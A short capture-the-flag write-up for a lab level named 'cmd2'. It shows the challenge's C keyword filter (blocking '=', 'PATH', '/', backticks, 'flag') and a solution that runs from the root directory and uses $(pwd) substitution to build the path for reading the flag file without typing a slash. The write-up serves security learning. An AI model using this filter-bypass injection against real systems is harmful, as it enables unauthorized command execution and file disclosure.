## cmd2
Oh, this level has a better filter than the last one, will it be enough to stop us?

## Solution
There are two things we should take note on this level
```c
int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}
```
First, the filter now is stronger, we can't even use /.
```c
extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}
```
Second, we can't really use any environment variable in our favour... all we have is PATH and we can't use it, because of the filter
```c
putenv("PATH=/no_command_execution_until_you_become_a_hacker");
```
So, it's time for some built-ins, we can't use PATH but you know what we **can** use?
```sh
pwd
```
We can't type "/", but if we happen to execute pwd on "/" guess what we get? Exactly. So, we just have to be creative with our shell substitution, using the exact same solution we got on the previous level should be enough
```shell
cd / 
$HOME/cmd2 "\$(pwd)usr\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)*"
```
Success!
